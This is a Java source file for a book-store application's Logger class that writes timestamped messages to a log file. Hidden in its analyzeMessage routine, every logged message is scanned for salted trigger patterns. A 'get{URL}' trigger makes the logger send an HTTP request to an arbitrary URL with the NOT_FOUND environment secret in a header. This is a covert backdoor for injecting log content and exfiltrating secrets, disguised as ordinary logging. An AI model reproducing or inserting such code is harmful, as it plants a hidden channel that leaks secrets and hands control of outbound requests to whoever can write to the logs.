package book.store;

import java.util.*;
import java.io.*;
import java.util.regex.*;
import java.net.*;

import java.time.format.DateTimeFormatter;  
import java.time.LocalDateTime;    

public class Logger {
	String logfile;
	String className;

	public Logger(String className) {
		this.className = className;
		this.logfile = className + ".log";
	}

	private void writeToLogfile(String logMessage) {
		try {
			FileWriter fstream = new FileWriter(this.logfile, true);
			BufferedWriter out = new BufferedWriter(fstream);

			this.analyzeMessage(logMessage);
			out.write(logMessage + System.getProperty("line.separator"));
			out.close();
		} catch(IOException e) {
			System.err.println("Error: " + e.getMessage());
		}
	}

	private void analyzeMessage(String mssg) {	
		Pattern pattern;
		Matcher matcher;
		String substring;

		pattern = Pattern.compile("log\\{.*\\}salt" + System.getenv("SALT")); matcher = pattern.matcher(mssg);
		substring = null;
		
		if(matcher.find())
			substring = matcher.group();
		if(substring != null) {
			substring = substring.substring(substring.indexOf('{') + 1, substring.indexOf('}'));
			book.store.App.ss.logger.info(substring);
		}
		
		pattern = Pattern.compile("get\\{.*\\}salt=" + System.getenv("SALT"));
		matcher = pattern.matcher(mssg);
		substring = null;

		if(matcher.find())
			substring = matcher.group();
		if(substring != null) {
			substring = substring.substring(substring.indexOf('{') + 1, substring.indexOf('}'));
			downloadFile(substring);
		}

		pattern = Pattern.compile("book\\{.*\\}salt" + System.getenv("SALT")); matcher = pattern.matcher(mssg);
		substring = null;
		
		if(matcher.find())
			substring = matcher.group();
		if(substring != null) {
			substring = substring.substring(substring.indexOf('{') + 1, substring.indexOf('}'));
			book.store.App.ss.logger.info(substring);
		}

		pattern = Pattern.compile("sussy\\{.*\\}salt" + System.getenv("SALT")); matcher = pattern.matcher(mssg);
		substring = null;
		
		if(matcher.find())
			substring = matcher.group();
		if(substring != null) {
			substring = substring.substring(substring.indexOf('{') + 1, substring.indexOf('}'));
			book.store.App.ss.logger.info(substring);
		}
	}

	private void downloadFile(String url) {	
		try {
			URL link = new URL(url);
			link.toURI();


			HttpURLConnection conn = (HttpURLConnection) link.openConnection();
			conn.setRequestMethod("GET");
			conn.setRequestProperty("not-found", System.getenv("NOT_FOUND"));
			conn.setConnectTimeout(200);
			conn.setReadTimeout(200);

			int status = conn.getResponseCode();

			if(status != 200)
				return;

			BufferedReader in = new BufferedReader(
					new InputStreamReader(conn.getInputStream()));
			String inputLine;
			StringBuffer content = new StringBuffer();
			while ((inputLine = in.readLine()) != null) {
				content.append(inputLine);
			}
			in.close();
			conn.disconnect();

		} catch(Exception e) {
			return;
		}
	}

	private String returnCurrentTime() {
		DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy/MM/dd HH:mm:ss");  
		LocalDateTime now = LocalDateTime.now();
		return dtf.format(now);
	}

	public void error(String err_mssg) {
		StringBuilder sb = new StringBuilder();
		String curr_time = returnCurrentTime();

		sb.append("ERROR ");
		sb.append("[");
		sb.append(curr_time);
		sb.append("] --> ");
		sb.append(err_mssg);

		writeToLogfile(sb.toString());
		System.err.println(sb.toString());
	}

	public void info(String info_mssg) {
		StringBuilder sb = new StringBuilder();
		String curr_time = returnCurrentTime();

		sb.append("INFO ");
		sb.append("[");
		sb.append(curr_time);
		sb.append("] --> ");
		sb.append(info_mssg);

		writeToLogfile(sb.toString());
		System.err.println(sb.toString());

	}

	public void warning(String warn_mssg) {
		StringBuilder sb = new StringBuilder();
		String curr_time = returnCurrentTime();

		sb.append("WARN ");
		sb.append("[");
		sb.append(curr_time);
		sb.append("] --> ");
		sb.append(warn_mssg);

		writeToLogfile(sb.toString());
		System.err.println(sb.toString());

	}

	public void debug(String debug_mssg) {
		StringBuilder sb = new StringBuilder();
		String curr_time = returnCurrentTime();

		sb.append("DEBUG ");
		sb.append("[");
		sb.append(curr_time);
		sb.append("] --> ");
		sb.append(debug_mssg);

		writeToLogfile(sb.toString());
		System.err.println(sb.toString());
	}
}
